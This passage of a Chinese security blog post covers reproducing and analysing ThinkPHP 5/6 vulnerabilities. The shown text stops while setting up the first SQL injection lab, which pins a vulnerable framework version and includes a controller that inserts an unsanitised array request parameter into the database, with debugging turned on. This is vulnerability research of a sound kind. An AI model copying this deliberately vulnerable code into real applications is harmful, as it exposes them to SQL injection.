<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content=". 先从tp5开始然后是tp6，参考文章如下： https:&#x2F;&#x2F;github.com&#x2F;Mochazz&#x2F;ThinkPHP-Vuln ThinkPHP5-SQL注入篇ThinkPHP5漏洞分析之SQL注入(一)12影响版本：5.0.13&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.15 、 5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.5  12&#x2F;&#x2F; 获取环境代码composer create-">
<meta property="og:type" content="article">
<meta property="og:title" content="thinkphp5和6常见漏洞复现及原理分析">
<meta property="og:url" content="http://example.com/2023/05/17/thinkphp5%E5%92%8C6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="塔菲">
<meta property="og:description" content=". 先从tp5开始然后是tp6，参考文章如下： https:&#x2F;&#x2F;github.com&#x2F;Mochazz&#x2F;ThinkPHP-Vuln ThinkPHP5-SQL注入篇ThinkPHP5漏洞分析之SQL注入(一)12影响版本：5.0.13&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.15 、 5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.5  12&#x2F;&#x2F; 获取环境代码composer create-">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/17/image.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/17/image886dcbfdca585bdf.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/17/image9ea905006f6e60d4.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/17/imageac8454508dbf822b.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/17/imagea7599f06354bc180.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/17/imagefaa5f37754c30c1f.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/17/image31cf5a1e6d46fa63.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/17/image1e811d55a0b3e24b.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/17/imagebe75ada6b0532307.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/17/image7c2ece9f301e6510.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/17/image0e94e7f12e5b417d.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/17/image31cf51bfa2e1ebba.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image8ca19ad1165f79ab.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imagea410bf55b4cec7a2.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image8e0eee02f6be8d7c.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imageaebca840253eeabb.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image2b497c24b0229c06.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imagea333e0dd58ac27dc.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image135ea5826a355fb0.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imageb441c2598013889b.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imageb3e3221e109c5d8a.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image36eb72253dedb86c.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imaged3ffbc016fd77a44.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imageb05ea6378a4ef028.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imageecf2c4bbfb813f22.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image693887cccf9ea155.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image038610f3b83c2b94.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image5532dce84b13805e.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imageacc246ef044c3628.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imageb3d18a6b5f423e5a.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imagedfe448733213292c.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imagedfe448733213292c.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imagebb2b0eb8885cb2b6.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imaged62d6b98249f9164.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image5843238ae3869266.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imageaddc2124de6271ab.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imagec9af240067fef554.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imagef9387797f1e6db53.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image6259666043d64b3f.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image48cbd1d6a2256025.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image5e8db5926c09b121.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imagecf2e52504f14ccc7.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image7a88fbb4b9a035ea.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image6064249918fb5ee7.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image3a023dd31afa1ae2.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image981e6b4f18bf5c44.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imagef58aa58e412a6616.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imaged0f4802f7435e45b.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imaged9cb2ac33268f989.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image3c67272ba89c702b.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image9d98fb5757cbff7d.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image5c0bbbe027423b13.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image72084bf731e71cb8.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imaged223319f2c31de0e.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imagef63346bcb855b28f.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image2953040f10f608ea.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image0c89852c497ea1ce.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imageb5cd23c395a6d554.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image4da4f542e81b84d7.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imaged5ce447de4e14e27.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image26f1f9cb1eedd393.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image4a399e0badf3c537.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image1cb37b766379aa57.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imagec487fde2506e05dc.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image128b20d342848ee4.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image57b27834d87449d5.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image6d10e2053261c113.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image67f80b1b703ace55.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image9a1d52b02af188c3.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image86aa886ecbad8bf5.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imagec6a32324e9b0ec9b.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image9e04c7750de7e344.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image39c579e8c2e7f4d5.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image7389ba7f9a6ec4f2.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imagea5b001341216930d.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image192d9615b654d22c.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image6e21f5f5a75ae9c8.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image358f4d17de8a30e9.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image80970fbdbe8a161b.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/imagec34cf46ffb56d3e0.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image8f738df215263fee.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image5d1dd3b92751ea20.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image6c194e542d8abd56.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image8c064d4a0170b0a3.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/18/image5cf6ba2d9fe2f4cd.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/imageecea46bad0ed4e66.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/image28811b7da296f824.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/image5bf30a018274c7dc.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/imagef122925c9e9c6c9a.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/image65e86e3c895db072.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/image28c6ba486af3d423.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/image177b5988f209a7d8.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/imagea92e913a12b80c0c.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/image4b1687911548b8e5.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/image7888b9ac5229413a.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/image.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/image3cfdf8d5d2e907da.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/image2c4e4b5d76c3f896.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/imagef86a2dfe44fbb7a5.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/imagec98a03245505aa56.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/image3ba969da79973a0f.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/imagec3e89ec08cbbc444.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/image4a232259c7453f97.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/imageecf87775e96408ef.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/imagec43764d4586d60a8.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/imageefc35ab3ec30a5de.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/image58a5f697eb81f533.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/image407bbb24ede55f6d.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/imagebd133d96038582be.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/image3d60af507fdb9891.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/image966a53ae81e2c771.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/image350be60b0bd3e014.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/image6bd71b355f858471.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/image17f6508df1e76fe9.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/19/image62622351aa306c7a.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/21/image8a1b73b15d04d28f.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/21/image82f0a0fd98a72fc5.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/21/image415f421817c93dd7.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/21/image327415619f712666.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/21/image2b0d5dd14469a473.png">
<meta property="article:published_time" content="2023-05-17T12:24:10.000Z">
<meta property="article:modified_time" content="2024-01-09T07:36:35.173Z">
<meta property="article:author" content="塔菲">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdnjson.com/images/2023/05/17/image.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>thinkphp5和6常见漏洞复现及原理分析</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.2"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/05/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/05/15/webshell%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7%E6%88%90%E6%9E%9C%E5%B1%95%E7%A4%BA/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/05/17/thinkphp5%E5%92%8C6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/05/17/thinkphp5%E5%92%8C6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/&text=thinkphp5和6常见漏洞复现及原理分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/05/17/thinkphp5%E5%92%8C6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/&title=thinkphp5和6常见漏洞复现及原理分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/05/17/thinkphp5%E5%92%8C6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/&is_video=false&description=thinkphp5和6常见漏洞复现及原理分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=thinkphp5和6常见漏洞复现及原理分析&body=Check out this article: http://example.com/2023/05/17/thinkphp5%E5%92%8C6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/05/17/thinkphp5%E5%92%8C6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/&title=thinkphp5和6常见漏洞复现及原理分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/05/17/thinkphp5%E5%92%8C6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/&title=thinkphp5和6常见漏洞复现及原理分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/05/17/thinkphp5%E5%92%8C6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/&title=thinkphp5和6常见漏洞复现及原理分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/05/17/thinkphp5%E5%92%8C6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/&title=thinkphp5和6常见漏洞复现及原理分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/05/17/thinkphp5%E5%92%8C6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/&name=thinkphp5和6常见漏洞复现及原理分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/05/17/thinkphp5%E5%92%8C6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/&t=thinkphp5和6常见漏洞复现及原理分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ThinkPHP5-SQL%E6%B3%A8%E5%85%A5%E7%AF%87"><span class="toc-number">1.</span> <span class="toc-text">ThinkPHP5-SQL注入篇</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-%E4%B8%80"><span class="toc-number">1.1.</span> <span class="toc-text">ThinkPHP5漏洞分析之SQL注入(一)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-%E4%BA%8C"><span class="toc-number">1.2.</span> <span class="toc-text">ThinkPHP5漏洞分析之SQL注入(二)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-%E4%B8%89"><span class="toc-number">1.3.</span> <span class="toc-text">ThinkPHP5漏洞分析之SQL注入(三)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-%E5%9B%9B"><span class="toc-number">1.4.</span> <span class="toc-text">ThinkPHP5漏洞分析之SQL注入(四)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-%E4%BA%94"><span class="toc-number">1.5.</span> <span class="toc-text">ThinkPHP5漏洞分析之SQL注入(五)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-%E5%85%AD"><span class="toc-number">1.6.</span> <span class="toc-text">ThinkPHP5漏洞分析之SQL注入(六)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ThinkPHP5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%AF%87"><span class="toc-number">2.</span> <span class="toc-text">ThinkPHP5-代码执行篇</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88%E4%B8%80%EF%BC%89"><span class="toc-number">2.1.</span> <span class="toc-text">ThinkPHP5漏洞分析之代码执行（一）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88%E4%BA%8C%EF%BC%89"><span class="toc-number">2.2.</span> <span class="toc-text">ThinkPHP5漏洞分析之代码执行（二）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88%E4%B8%89%EF%BC%89"><span class="toc-number">2.3.</span> <span class="toc-text">ThinkPHP5漏洞分析之代码执行（三）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ThinkPHP5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87"><span class="toc-number">3.</span> <span class="toc-text">ThinkPHP5-文件包含篇</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ThinkPHP5-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87"><span class="toc-number">4.</span> <span class="toc-text">ThinkPHP5-反序列化篇</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5-0-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%885-0-24%EF%BC%89"><span class="toc-number">4.1.</span> <span class="toc-text">ThinkPHP5.0.X反序列化（5.0.24）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5-0-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%885-2-24%EF%BC%89"><span class="toc-number">4.2.</span> <span class="toc-text">ThinkPHP5.0.X反序列化（5.2.24）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5-1-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%885-1-24%EF%BC%89"><span class="toc-number">4.3.</span> <span class="toc-text">ThinkPHP5.1.X反序列化（5.1.24）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">4.3.1.</span> <span class="toc-text">利用条件</span></a></li></ol></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        thinkphp5和6常见漏洞复现及原理分析
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">塔菲</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-05-17T12:24:10.000Z" class="dt-published" itemprop="datePublished">2023-05-17</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>.</p>
<p>先从tp5开始然后是tp6，参考文章如下：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Mochazz/ThinkPHP-Vuln">https://github.com/Mochazz/ThinkPHP-Vuln</a></p>
<h3 id="ThinkPHP5-SQL注入篇"><a href="#ThinkPHP5-SQL注入篇" class="headerlink" title="ThinkPHP5-SQL注入篇"></a>ThinkPHP5-SQL注入篇</h3><h4 id="ThinkPHP5漏洞分析之SQL注入-一"><a href="#ThinkPHP5漏洞分析之SQL注入-一" class="headerlink" title="ThinkPHP5漏洞分析之SQL注入(一)"></a>ThinkPHP5漏洞分析之SQL注入(一)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">影响版本：</span><br><span class="line">5.0.13&lt;=ThinkPHP&lt;=5.0.15 、 5.1.0&lt;=ThinkPHP&lt;=5.1.5</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 获取环境代码</span><br><span class="line">composer create-project --prefer-dist topthink/think=5.0.15 tpdemo</span><br></pre></td></tr></table></figure>

<p>将 <strong>composer.json</strong> 文件的 <strong>require</strong> 字段设置成如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;require&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;php&quot;</span>: <span class="string">&quot;&gt;=5.4.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;topthink/framework&quot;</span>: <span class="string">&quot;5.0.15&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后执行 <code>composer update</code> ，并将 <strong>application/index/controller/Index.php</strong> 文件代码设置如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">db</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">insert</span>([<span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 <strong>application/database.php</strong> 文件中配置数据库相关信息，并开启 <strong>application/config.php</strong> 中的 <strong>app_debug</strong> 和 <strong>app_trace</strong> 。</p>
